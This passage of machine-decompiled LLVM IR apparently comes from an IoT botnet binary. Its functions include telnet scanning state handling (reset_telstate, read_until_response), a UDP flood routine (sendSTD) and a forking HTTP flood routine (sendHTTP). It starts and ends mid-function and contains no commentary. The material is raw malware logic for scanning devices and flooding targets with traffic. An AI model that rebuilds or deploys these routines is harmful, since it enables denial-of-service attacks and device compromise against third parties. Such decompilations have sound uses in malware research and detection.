  %v1_804ae59 = call i32 @reset_telstate(i32 %stack_var_-624.243)
  store i32 %v1_804ae59, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b021

dec_label_pc_804ae66:                             ; preds = %dec_label_pc_804ac2b
  store i32 %v1_804a164, i32* %edx.global-to-local, align 4
  store i32 %v1_804a176, i32* %eax.global-to-local, align 4
  %v2_804ae81 = load i32, i32* %v1_804a179, align 4
  store i32 %v2_804ae81, i32* %eax.global-to-local, align 4
  %v1_804ae83 = add i32 %v2_804ae81, 7
  store i32 %v1_804ae83, i32* @ebx, align 4
  %v1_804ae89 = add i32 %v0_804ac78, 16
  %v2_804ae89 = inttoptr i32 %v1_804ae89 to i32*
  store i32 0, i32* %v2_804ae89, align 4
  %v1_804ae8b = inttoptr i32 %stack_var_-624.243 to i32*
  %v2_804ae8b = call i32 @__GI_time(i32* %v1_804ae8b)
  store i32 %v2_804ae8b, i32* %eax.global-to-local, align 4
  %v0_804ae93 = load i32, i32* @ebx, align 4
  %v7_804ae93 = icmp ult i32 %v0_804ae93, %v2_804ae8b
  %v1_804ae95 = icmp eq i1 %v7_804ae93, false
  br i1 %v1_804ae95, label %dec_label_pc_804b021, label %dec_label_pc_804ae9b

dec_label_pc_804ae9b:                             ; preds = %dec_label_pc_804ae66
  %v0_804ae90 = load i32, i32* @esp, align 4
  store i32 %v1_804a164, i32* @edx, align 4
  store i32 %v2_804a174, i32* %eax.global-to-local, align 4
  %v3_804aeb7 = inttoptr i32 %v0_804ae90 to i32*
  store i32 %v2_804a174, i32* %v3_804aeb7, align 4
  %v1_804aeb8 = call i32 @reset_telstate(i32 %stack_var_-624.243)
  store i32 %v1_804aeb8, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b021

dec_label_pc_804aec5:                             ; preds = %dec_label_pc_804a1ad
  store i32 %storemerge45, i32* @ebx, align 4
  %v0_804aec8 = load i32, i32* @esp, align 4
  %v1_804aecb = add i32 %v0_804aec8, -16
  %v2_804aecb = inttoptr i32 %v1_804aecb to i32*
  store i32 0, i32* %v2_804aecb, align 4
  %v1_804aecd = inttoptr i32 %v6_804a1c3 to i32*
  %v2_804aecd = call i32 @__GI_time(i32* %v1_804aecd)
  %v0_804aeda = load i32, i32* @ebx, align 4
  %v2_804aeea = mul i32 %v0_804aeda, 28
  %v1_804aeee = add i32 %v2_804acaa, %v2_804aeea
  %v2_804aef1 = inttoptr i32 %v1_804aeee to i32*
  store i32 %v2_804aecd, i32* %v2_804aef1, align 4
  store i32 %v1_804a164, i32* %edx.global-to-local, align 4
  store i32 %v2_804a172, i32* %eax.global-to-local, align 4
  %v3_804af09 = inttoptr i32 %v2_804a174 to i32*
  %v4_804af09 = load i32, i32* %v3_804af09, align 4
  store i32 %v4_804af09, i32* %eax.global-to-local, align 4
  %v0_804af0c = load i32, i32* @esp, align 4
  %v1_804af0c = add i32 %v0_804af0c, -4
  %v2_804af0c = inttoptr i32 %v1_804af0c to i32*
  store i32 16384, i32* %v2_804af0c, align 4
  %v1_804af11 = add i32 %v0_804af0c, -8
  %v2_804af11 = inttoptr i32 %v1_804af11 to i32*
  store i32 4, i32* %v2_804af11, align 4
  %v1_804af13 = add i32 %v0_804af0c, -12
  %v2_804af13 = inttoptr i32 %v1_804af13 to i32*
  store i32 ptrtoint ([5 x i8]* @global_var_80561d9.60 to i32), i32* %v2_804af13, align 4
  %v0_804af18 = load i32, i32* %eax.global-to-local, align 4
  %v2_804af18 = add i32 %v0_804af0c, -16
  %v3_804af18 = inttoptr i32 %v2_804af18 to i32*
  store i32 %v0_804af18, i32* %v3_804af18, align 4
  %v4_804af19 = call i32 @__libc_send(i32 %stack_var_-624.243, i32 %stack_var_-620.244, i32 %v2_804a07d, i32 %v6_804a1c3)
  %v0_804af1e = load i32, i32* @esp, align 4
  store i32 %v1_804a164, i32* %edx.global-to-local, align 4
  store i32 %v2_804a172, i32* %eax.global-to-local, align 4
  %v4_804af37 = load i32, i32* %v3_804af09, align 4
  store i32 %v4_804af37, i32* %eax.global-to-local, align 4
  %v1_804af3a = add i32 %v0_804af1e, 12
  %v2_804af3a = inttoptr i32 %v1_804af3a to i32*
  store i32 16384, i32* %v2_804af3a, align 4
  %v1_804af3f = add i32 %v0_804af1e, 8
  %v2_804af3f = inttoptr i32 %v1_804af3f to i32*
  store i32 7, i32* %v2_804af3f, align 4
  %v1_804af41 = add i32 %v0_804af1e, 4
  %v2_804af41 = inttoptr i32 %v1_804af41 to i32*
  store i32 ptrtoint ([8 x i8]* @global_var_80561de.61 to i32), i32* %v2_804af41, align 4
  %v0_804af46 = load i32, i32* %eax.global-to-local, align 4
  %v3_804af46 = inttoptr i32 %v0_804af1e to i32*
  store i32 %v0_804af46, i32* %v3_804af46, align 4
  %v4_804af47 = call i32 @__libc_send(i32 %stack_var_-624.243, i32 %stack_var_-620.244, i32 %v2_804a07d, i32 %v6_804a1c3)
  %v0_804af4f = load i32, i32* bitcast ([443 x i8]** @global_var_80591d4.63 to i32*), align 4
  %v5_804af59 = inttoptr i32 %v0_804af4f to i8*
  %v1_804af5f = and i32 %v0_804af4f, -256
  store i32 %v1_804af5f, i32* %eax.global-to-local, align 4
  store i32 %v0_804af4f, i32* @edi, align 4
  %v3_804af68 = call i32 @_strlen(i8* %v5_804af59)
  store i32 %v3_804af68, i32* @ebx, align 4
  %v0_804af71 = load i32, i32* bitcast ([443 x i8]** @global_var_80591d4.63 to i32*), align 4
  store i32 %v0_804af71, i32* @esi, align 4
  store i32 %v1_804a164, i32* %edx.global-to-local, align 4
  store i32 %v2_804a172, i32* %eax.global-to-local, align 4
  %v4_804af8d = load i32, i32* %v3_804af09, align 4
  store i32 %v4_804af8d, i32* %eax.global-to-local, align 4
  %v0_804af90 = load i32, i32* @esp, align 4
  %v1_804af90 = add i32 %v0_804af90, -4
  %v2_804af90 = inttoptr i32 %v1_804af90 to i32*
  store i32 16384, i32* %v2_804af90, align 4
  %v0_804af95 = load i32, i32* @ebx, align 4
  %v2_804af95 = add i32 %v0_804af90, -8
  %v3_804af95 = inttoptr i32 %v2_804af95 to i32*
  store i32 %v0_804af95, i32* %v3_804af95, align 4
  %v0_804af96 = load i32, i32* @esi, align 4
  %v2_804af96 = add i32 %v0_804af90, -12
  %v3_804af96 = inttoptr i32 %v2_804af96 to i32*
  store i32 %v0_804af96, i32* %v3_804af96, align 4
  %v0_804af97 = load i32, i32* %eax.global-to-local, align 4
  %v2_804af97 = add i32 %v0_804af90, -16
  %v3_804af97 = inttoptr i32 %v2_804af97 to i32*
  store i32 %v0_804af97, i32* %v3_804af97, align 4
  %v5_804af98 = call i32 @__libc_send(i32 %v0_804af4f, i32 %stack_var_-624.243, i32 %stack_var_-620.244, i32 %v2_804a07d)
  store i32 %v5_804af98, i32* %eax.global-to-local, align 4
  %v0_804af9d = load i32, i32* @esp, align 4
  %v2_804afa0 = icmp slt i32 %v5_804af98, 0
  %v1_804afa2 = icmp eq i1 %v2_804afa0, false
  store i32 %v1_804a164, i32* @edx, align 4
  br i1 %v1_804afa2, label %dec_label_pc_804afcb, label %dec_label_pc_804afa4

dec_label_pc_804afa4:                             ; preds = %dec_label_pc_804aec5
  store i32 %v2_804a174, i32* %eax.global-to-local, align 4
  %v3_804afc0 = inttoptr i32 %v0_804af9d to i32*
  store i32 %v2_804a174, i32* %v3_804afc0, align 4
  %v2_804afc1 = call i32 @reset_telstate(i32 %v0_804af4f)
  store i32 %v2_804afc1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b021

dec_label_pc_804afcb:                             ; preds = %dec_label_pc_804aec5
  store i32 %v1_804a176, i32* %eax.global-to-local, align 4
  %v2_804afe6 = load i32, i32* %v1_804a179, align 4
  store i32 %v2_804afe6, i32* %eax.global-to-local, align 4
  %v1_804afe8 = add i32 %v2_804afe6, 25
  store i32 %v1_804afe8, i32* @ebx, align 4
  %v2_804afee = inttoptr i32 %v0_804af9d to i32*
  store i32 0, i32* %v2_804afee, align 4
  %tmp39 = inttoptr i32 %v0_804af4f to i32*
  %v3_804aff0 = call i32 @__GI_time(i32* %tmp39)
  store i32 %v3_804aff0, i32* %eax.global-to-local, align 4
  %v0_804aff8 = load i32, i32* @ebx, align 4
  %v7_804aff8 = icmp ult i32 %v0_804aff8, %v3_804aff0
  %v1_804affa = icmp eq i1 %v7_804aff8, false
  br i1 %v1_804affa, label %dec_label_pc_804b021, label %dec_label_pc_804affc

dec_label_pc_804affc:                             ; preds = %dec_label_pc_804afcb
  %v0_804aff5 = load i32, i32* @esp, align 4
  store i32 %v1_804a164, i32* @edx, align 4
  store i32 %v2_804a174, i32* %eax.global-to-local, align 4
  %v3_804b018 = inttoptr i32 %v0_804aff5 to i32*
  store i32 %v2_804a174, i32* %v3_804b018, align 4
  %v2_804b019 = call i32 @reset_telstate(i32 %v0_804af4f)
  store i32 %v2_804b019, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b021

dec_label_pc_804b021:                             ; preds = %dec_label_pc_804a1ad, %dec_label_pc_804afcb, %dec_label_pc_804ae66, %dec_label_pc_804aa84, %dec_label_pc_804a800, %dec_label_pc_804a6c4, %dec_label_pc_804a34d, %dec_label_pc_804afa4, %dec_label_pc_804ae9b, %dec_label_pc_804ae3c, %dec_label_pc_804ad85, %dec_label_pc_804ad59, %dec_label_pc_804acde, %dec_label_pc_804abff, %dec_label_pc_804abd5, %dec_label_pc_804ab79, %dec_label_pc_804aab9, %dec_label_pc_804aa58, %dec_label_pc_804aa2c, %dec_label_pc_804a97b, %dec_label_pc_804a951, %dec_label_pc_804a8f5, %dec_label_pc_804a835, %dec_label_pc_804a7d4, %dec_label_pc_804a7a8, %dec_label_pc_804a6f9, %dec_label_pc_804a69a, %dec_label_pc_804a612, %dec_label_pc_804a5e8, %dec_label_pc_804a4b2, %dec_label_pc_804a488, %dec_label_pc_804affc
  %stack_var_-624.1 = phi i32 [ %stack_var_-624.243, %dec_label_pc_804a1ad ], [ %stack_var_-624.243, %dec_label_pc_804afcb ], [ %stack_var_-624.243, %dec_label_pc_804affc ], [ %stack_var_-624.243, %dec_label_pc_804afa4 ], [ %stack_var_-624.243, %dec_label_pc_804ae66 ], [ %stack_var_-624.243, %dec_label_pc_804ae9b ], [ %stack_var_-624.243, %dec_label_pc_804ae3c ], [ %stack_var_-624.243, %dec_label_pc_804ad85 ], [ %stack_var_-624.243, %dec_label_pc_804ad59 ], [ %stack_var_-624.243, %dec_label_pc_804acde ], [ %v4_804ab02, %dec_label_pc_804abff ], [ %v4_804ab02, %dec_label_pc_804abd5 ], [ %v4_804ab02, %dec_label_pc_804ab79 ], [ %stack_var_-624.243, %dec_label_pc_804aa84 ], [ %stack_var_-624.243, %dec_label_pc_804aab9 ], [ %stack_var_-624.243, %dec_label_pc_804aa58 ], [ %stack_var_-624.243, %dec_label_pc_804aa2c ], [ %stack_var_-624.243, %dec_label_pc_804a97b ], [ %stack_var_-624.243, %dec_label_pc_804a951 ], [ %stack_var_-624.243, %dec_label_pc_804a8f5 ], [ %stack_var_-624.243, %dec_label_pc_804a800 ], [ %stack_var_-624.243, %dec_label_pc_804a835 ], [ %stack_var_-624.243, %dec_label_pc_804a7d4 ], [ %stack_var_-624.243, %dec_label_pc_804a7a8 ], [ %stack_var_-624.243, %dec_label_pc_804a6c4 ], [ %stack_var_-624.243, %dec_label_pc_804a6f9 ], [ %stack_var_-624.243, %dec_label_pc_804a69a ], [ %stack_var_-624.243, %dec_label_pc_804a612 ], [ %stack_var_-624.243, %dec_label_pc_804a5e8 ], [ %stack_var_-624.243, %dec_label_pc_804a34d ], [ %stack_var_-624.243, %dec_label_pc_804a4b2 ], [ %stack_var_-624.243, %dec_label_pc_804a488 ]
  %stack_var_-620.1 = phi i32 [ %stack_var_-620.244, %dec_label_pc_804a1ad ], [ %stack_var_-620.244, %dec_label_pc_804afcb ], [ %stack_var_-620.244, %dec_label_pc_804affc ], [ %stack_var_-620.244, %dec_label_pc_804afa4 ], [ %stack_var_-620.244, %dec_label_pc_804ae66 ], [ %stack_var_-620.244, %dec_label_pc_804ae9b ], [ %stack_var_-620.244, %dec_label_pc_804ae3c ], [ %stack_var_-620.244, %dec_label_pc_804ad85 ], [ %stack_var_-620.244, %dec_label_pc_804ad59 ], [ %stack_var_-620.244, %dec_label_pc_804acde ], [ %stack_var_-620.244, %dec_label_pc_804abff ], [ %stack_var_-620.244, %dec_label_pc_804abd5 ], [ %stack_var_-620.244, %dec_label_pc_804ab79 ], [ %stack_var_-620.244, %dec_label_pc_804aa84 ], [ %stack_var_-620.244, %dec_label_pc_804aab9 ], [ %stack_var_-620.244, %dec_label_pc_804aa58 ], [ %stack_var_-620.244, %dec_label_pc_804aa2c ], [ %v4_804a87e, %dec_label_pc_804a97b ], [ %v4_804a87e, %dec_label_pc_804a951 ], [ %v4_804a87e, %dec_label_pc_804a8f5 ], [ %stack_var_-620.244, %dec_label_pc_804a800 ], [ %stack_var_-620.244, %dec_label_pc_804a835 ], [ %stack_var_-620.244, %dec_label_pc_804a7d4 ], [ %stack_var_-620.244, %dec_label_pc_804a7a8 ], [ %stack_var_-620.244, %dec_label_pc_804a6c4 ], [ %stack_var_-620.244, %dec_label_pc_804a6f9 ], [ %stack_var_-620.244, %dec_label_pc_804a69a ], [ %stack_var_-620.244, %dec_label_pc_804a612 ], [ %stack_var_-620.244, %dec_label_pc_804a5e8 ], [ %stack_var_-620.244, %dec_label_pc_804a34d ], [ %stack_var_-620.244, %dec_label_pc_804a4b2 ], [ %stack_var_-620.244, %dec_label_pc_804a488 ]
  %v4_804b021 = add nuw nsw i32 %storemerge45, 1
  store i32 %v4_804b021, i32* %eax.global-to-local, align 4
  %exitcond = icmp eq i32 %v4_804b021, %arg2
  br i1 %exitcond, label %dec_label_pc_804a152, label %dec_label_pc_804a15e

; uselistorder directives
  uselistorder i32 %v4_804b021, { 1, 2, 0 }
  uselistorder i32 %stack_var_-620.1, { 1, 0 }
  uselistorder i32 %stack_var_-624.1, { 1, 0 }
  uselistorder i32 %v0_804af1e, { 3, 0, 1, 2 }
  uselistorder i32 %v0_804ad30, { 1, 2, 3, 0 }
  uselistorder i32 %v0_804acd7, { 1, 2, 0 }
  uselistorder i32* %v1_804ac8b, { 2, 1, 0, 3 }
  uselistorder i32 %v0_804abce, { 1, 0, 2 }
  uselistorder i32 %v0_804ab72, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v4_804ab02, { 0, 2, 4, 5, 3, 6, 1, 7, 8, 9, 10 }
  uselistorder i32* %v2_804aa74, { 1, 0 }
  uselistorder i32 %v0_804aa25, { 1, 2, 0 }
  uselistorder i32 %v0_804a94a, { 1, 0, 2 }
  uselistorder i32 %v0_804a8ee, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v4_804a87e, { 0, 2, 4, 5, 3, 6, 1, 7, 8, 9, 10 }
  uselistorder i32* %v2_804a7f0, { 1, 0 }
  uselistorder i32 %v0_804a7a1, { 1, 2, 0 }
  uselistorder i32 %v0_804a665, { 1, 0 }
  uselistorder i32 %v13_804a63d, { 1, 0 }
  uselistorder i32 %v0_804a638, { 2, 0, 1 }
  uselistorder i32 %v0_804a583, { 0, 1, 6, 2, 3, 4, 5 }
  uselistorder i32 %v5_804a57e, { 3, 2, 0, 1, 4 }
  uselistorder i32 %v1_804a52e, { 1, 0 }
  uselistorder i32 %v2_804a512, { 1, 0 }
  uselistorder i32 %v0_804a4cb, { 1, 0 }
  uselistorder i32 %v0_804a446, { 2, 0, 1 }
  uselistorder i32 %v12_804a41e, { 1, 0 }
  uselistorder i32 %v0_804a419, { 2, 0, 1 }
  uselistorder i32 %v2_804a39b, { 2, 0, 1, 3, 4, 5, 6, 7 }
  uselistorder i32 %v0_804a360, { 2, 0, 1 }
  uselistorder i32 %v1_804a32f, { 1, 0 }
  uselistorder i32 %v2_804a22d, { 1, 0 }
  uselistorder i32 %v6_804a1c3, { 9, 10, 11, 8, 6, 7, 5, 3, 4, 2, 1, 13, 12, 14, 0 }
  uselistorder i32* %v1_804a179, { 4, 3, 2, 1, 0, 5 }
  uselistorder i32 %v1_804a176, { 4, 3, 2, 1, 0, 5, 6 }
  uselistorder i32 %v2_804a174, { 49, 50, 51, 52, 53, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 33, 34, 35, 36, 37, 27, 28, 29, 30, 31, 32, 22, 23, 24, 25, 26, 16, 17, 18, 19, 20, 21, 8, 9, 10, 11, 12, 13, 14, 15, 0, 1, 2, 3, 4, 6, 5, 7, 54 }
  uselistorder i32 %v2_804a172, { 11, 12, 13, 1, 14, 0, 15, 2, 16, 17, 18, 19, 20, 3, 21, 22, 23, 24, 25, 4, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 10, 6, 38, 5, 39, 40, 7, 41, 43, 8, 42, 9 }
  uselistorder i32 %v1_804a164, { 0, 1, 2, 3, 4, 12, 13, 5, 6, 7, 8, 9, 10, 11, 14, 15, 16, 17, 18, 19, 20, 22, 21, 23, 24, 25, 26, 27, 28, 29, 30, 32, 31, 33, 34, 35, 40, 41, 36, 37, 38, 39, 42, 43, 44, 46, 45, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57 }
  uselistorder i32 %stack_var_-624.243, { 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 15, 10, 8, 6, 5, 4, 0, 3, 2, 1, 9, 7, 14, 16, 13, 12, 11 }
  uselistorder i32 %stack_var_-620.244, { 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 29, 26, 24, 22, 21, 20, 16, 14, 12, 9, 8, 7, 6, 5, 4, 0, 3, 2, 1, 11, 10, 13, 15, 19, 18, 17, 25, 23, 28, 30, 27 }
  uselistorder i32 %storemerge45, { 0, 3, 4, 5, 6, 8, 7, 1, 2 }
  uselistorder i32 %v4_804a141, { 1, 2, 0 }
  uselistorder i32 %storemerge251, { 1, 0 }
  uselistorder i32 %v2_804a09a, { 1, 0 }
  uselistorder i32 %v2_804a07d, { 14, 13, 12, 16, 15, 17, 18, 21, 20, 19, 5, 6, 7, 8, 22, 1, 2, 3, 4, 9, 0, 10, 11 }
  uselistorder i32 %v1_804a029, { 1, 0, 2 }
  uselistorder i32* %stack_var_-604, { 0, 1, 3, 2 }
  uselistorder i32* %stack_var_-596, { 4, 0, 2, 1, 3, 5, 6, 7 }
  uselistorder i32* %stack_var_-316, { 2, 1, 0, 3 }
  uselistorder i32* %stack_var_-324, { 2, 1, 3, 0, 4, 5 }
  uselistorder i32* %stack_var_-328, { 3, 5, 4, 1, 0, 2, 6, 7 }
  uselistorder i32* %stack_var_-332, { 7, 0, 8, 10, 4, 6, 9, 2, 1, 5, 11, 3, 12, 13 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 38, 39, 40, 41, 42, 43, 44, 45, 46, 37, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61 }
  uselistorder i32* %eax.global-to-local, { 199, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 56, 55, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 77, 78, 81, 79, 80, 82, 83, 76, 84, 85, 86, 87, 88, 89, 91, 90, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 112, 113, 116, 114, 115, 117, 118, 111, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 176, 191, 193, 194, 195, 196, 197, 198, 192, 200, 201, 214, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 221, 215, 216, 217, 218, 219, 220 }
  uselistorder i32 (i32)* @contains_success, { 1, 0 }
  uselistorder i32 (i32)* @contains_fail, { 3, 2, 1, 0 }
  uselistorder i32 (i32)* @read_until_response, { 2, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @getsockopt, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @__libc_select, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32)* @reset_telstate, { 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i8 7, { 1, 0 }
  uselistorder i8 6, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 %arg1, { 4, 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_804b021, { 31, 1, 7, 8, 2, 9, 10, 11, 12, 13, 14, 15, 16, 3, 17, 18, 19, 20, 21, 22, 4, 23, 24, 25, 5, 26, 27, 28, 29, 30, 6, 0 }
  uselistorder label %dec_label_pc_804a34d, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804a1ad, { 1, 0 }
  uselistorder label %dec_label_pc_804a15e, { 1, 0 }
  uselistorder label %dec_label_pc_804a152, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804a141, { 2, 1, 0 }
}

define i32 @sendSTD(i32 %arg1, i16 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-188 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v4_804b048 = call i32 @socket(i32 2, i32 2, i32 0)
  %v2_804b058 = call i32 @__GI_time(i32* null)
  %v1_804b06a = call i32 @__GI_gethostbyname(i32 %arg1)
  %v2_804b075 = ptrtoint i32* %stack_var_-44 to i32
  store i32 0, i32* %stack_var_-44, align 4
  store i32 0, i32* %stack_var_-40, align 4
  %v1_804b096 = add i32 %v1_804b06a, 12
  %v2_804b096 = inttoptr i32 %v1_804b096 to i32*
  %v3_804b096 = load i32, i32* %v2_804b096, align 4
  %v2_804b09e = ptrtoint i32* %stack_var_-40 to i32
  %v1_804b0a4 = add i32 %v1_804b06a, 16
  %v2_804b0a4 = inttoptr i32 %v1_804b0a4 to i32*
  %v3_804b0a4 = load i32, i32* %v2_804b0a4, align 4
  %v1_804b0a7 = inttoptr i32 %v3_804b0a4 to i32*
  %v2_804b0a7 = load i32, i32* %v1_804b0a7, align 4
  %v4_804b0af = call i32 @bcopy(i32 %v2_804b0a7, i32 %v2_804b09e, i32 %v3_804b096)
  %v1_804b0ba = add i32 %v1_804b06a, 8
  %v2_804b0ba = inttoptr i32 %v1_804b0ba to i32*
  %v3_804b0ba = load i32, i32* %v2_804b0ba, align 4
  store i32 %v3_804b0ba, i32* %stack_var_-44, align 4
  %v4_804b0e5 = bitcast i32* %stack_var_-188 to i16*
  %v5_804b170 = add i32 %v2_804b058, %arg3
  br label %dec_label_pc_804b0cf

dec_label_pc_804b0cf:                             ; preds = %dec_label_pc_804b196, %entry
  %storemerge = phi i32 [ %v4_804b196, %dec_label_pc_804b196 ], [ 0, %entry ]
  %v5_804b0e5 = call i32 @memcpy(i16* %v4_804b0e5, i32 ptrtoint ([36 x i8*]* @global_var_80563a0.100 to i32), i32 144)
  store i32 %v5_804b0e5, i32* @eax, align 4
  %v0_804b0ed = call i32 @random()
  %v2_804b0fd = udiv i32 %v0_804b0ed, 36
  %tmp = mul nsw i32 %v2_804b0fd, -4
  %v2_804b11a = add i32 %v0_804b0ed, %tmp
  store i32 %v2_804b11a, i32* @ebx, align 4
  %tmp31 = icmp ult i32 %storemerge, 50
  br i1 %tmp31, label %dec_label_pc_804b0cf.dec_label_pc_804b196_crit_edge, label %dec_label_pc_804b138

dec_label_pc_804b0cf.dec_label_pc_804b196_crit_edge: ; preds = %dec_label_pc_804b0cf
  br label %dec_label_pc_804b196

dec_label_pc_804b138:                             ; preds = %dec_label_pc_804b0cf
  %v0_804b128 = load i32, i32* @ebp, align 4
  %v3_804b128 = add i32 %v0_804b128, -184
  %v2_804b128 = mul i32 %v2_804b11a, 4
  %v4_804b128 = add i32 %v3_804b128, %v2_804b128
  %v5_804b128 = inttoptr i32 %v4_804b128 to i32*
  %v6_804b128 = load i32, i32* %v5_804b128, align 4
  %v5_804b142 = call i32 @__libc_send(i32 %v4_804b048, i32 %v6_804b128, i32 65, i32 0)
  %v4_804b156 = call i32 @__libc_connect(i32 %v4_804b048, i32 %v2_804b075, i32 16)
  %v2_804b163 = call i32 @__GI_time(i32* null)
  %v5_804b175 = icmp slt i32 %v2_804b163, %v5_804b170
  br i1 %v5_804b175, label %dec_label_pc_804b196, label %dec_label_pc_804b177

dec_label_pc_804b177:                             ; preds = %dec_label_pc_804b138
  %v1_804b17d = call i32 @__libc_close(i32 %v4_804b048)
  %v1_804b18a = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_804b196:                             ; preds = %dec_label_pc_804b0cf.dec_label_pc_804b196_crit_edge, %dec_label_pc_804b138
  %stack_var_-16.0 = phi i32 [ %storemerge, %dec_label_pc_804b0cf.dec_label_pc_804b196_crit_edge ], [ 0, %dec_label_pc_804b138 ]
  %v4_804b196 = add i32 %stack_var_-16.0, 1
  br label %dec_label_pc_804b0cf

; uselistorder directives
  uselistorder i32 %v2_804b11a, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 0 }
  uselistorder i32 %v1_804b06a, { 1, 0, 2 }
  uselistorder i32* %stack_var_-40, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @bcopy, { 1, 0 }
  uselistorder i32 (i32)* @__GI_gethostbyname, { 1, 0 }
  uselistorder label %dec_label_pc_804b196, { 1, 0 }
}

define i32 @sendHTTP(i32 %arg1, i32 %arg2, i16 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %stack_var_-537 = alloca i32, align 4
  %stack_var_-536 = alloca i32, align 4
  %v0_804b1a1 = load i32, i32* @edi, align 4
  %v2_804b1b7 = call i32 @__GI_time(i32* null)
  %v5_804b1bf = add i32 %v2_804b1b7, %arg5
  %v2_804b208 = ptrtoint i32* %stack_var_-536 to i32
  %v4_804b25d = bitcast i32* %stack_var_-536 to i8*
  store i32 0, i32* @eax, align 4
  %v5_804b2ce38 = icmp sgt i32 %arg6, 0
  br i1 %v5_804b2ce38, label %dec_label_pc_804b1d8.lr.ph, label %dec_label_pc_804b2d4

dec_label_pc_804b1d8.lr.ph:                       ; preds = %entry
  br label %dec_label_pc_804b1d8

dec_label_pc_804b1d8:                             ; preds = %dec_label_pc_804b2c5, %dec_label_pc_804b1d8.lr.ph
  %storemerge39 = phi i32 [ 0, %dec_label_pc_804b1d8.lr.ph ], [ %v4_804b2c5, %dec_label_pc_804b2c5 ]
  %v0_804b1d8 = call i32 @random()
  %v5_804b20f = call i32 @sprintf(i32 %v2_804b208, i32 ptrtoint ([64 x i8]* @global_var_8056430.139 to i32), i32 %arg1, i32 %arg4)
  %v1_804b217 = call i32 @__libc_fork(i32 %v2_804b208)
  %v1_804b21c = icmp eq i32 %v1_804b217, 0
  br i1 %v1_804b21c, label %dec_label_pc_804b2c5, label %dec_label_pc_804b2a5.preheader

dec_label_pc_804b2a5.preheader:                   ; preds = %dec_label_pc_804b1d8
  %v2_804b2aa32 = call i32 @__GI_time(i32* null)
  store i32 %v2_804b2aa32, i32* @eax, align 4
  %v5_804b2b535 = icmp slt i32 %v2_804b2aa32, %v5_804b1bf
  br i1 %v5_804b2b535, label %dec_label_pc_804b226, label %dec_label_pc_804b2bb

dec_label_pc_804b226:                             ; preds = %dec_label_pc_804b2a5.preheader, %dec_label_pc_804b2a5.backedge
  %v3_804b238 = call i32 @socket_connect(i32 %arg2, i16 %arg3)
  %v4_804b243 = icmp eq i32 %v3_804b238, 0
  br i1 %v4_804b243, label %dec_label_pc_804b2a5.backedge, label %dec_label_pc_804b249

dec_label_pc_804b249:                             ; preds = %dec_label_pc_804b226
  store i1 false, i1* @df, align 1
  store i32 %v2_804b208, i32* @edi, align 4
  %v3_804b263 = call i32 @_strlen(i8* %v4_804b25d)
  %v4_804b278 = call i32 @__libc_write(i32 %v3_804b238, i32* nonnull %stack_var_-536, i32 %v3_804b263)
  %v4_804b28f = call i32 @__libc_read(i32 %v3_804b238, i32* nonnull %stack_var_-537, i32 1)
  %v1_804b29d = call i32 @__libc_close(i32 %v3_804b238)
  br label %dec_label_pc_804b2a5.backedge

dec_label_pc_804b2a5.backedge:                    ; preds = %dec_label_pc_804b249, %dec_label_pc_804b226
  %v2_804b2aa = call i32 @__GI_time(i32* null)
  store i32 %v2_804b2aa, i32* @eax, align 4
  %v5_804b2b5 = icmp slt i32 %v2_804b2aa, %v5_804b1bf
  br i1 %v5_804b2b5, label %dec_label_pc_804b226, label %dec_label_pc_804b2bb

dec_label_pc_804b2bb:                             ; preds = %dec_label_pc_804b2a5.backedge, %dec_label_pc_804b2a5.preheader
  %v1_804b2c0 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_804b2c5

dec_label_pc_804b2c5:                             ; preds = %dec_label_pc_804b1d8, %dec_label_pc_804b2bb
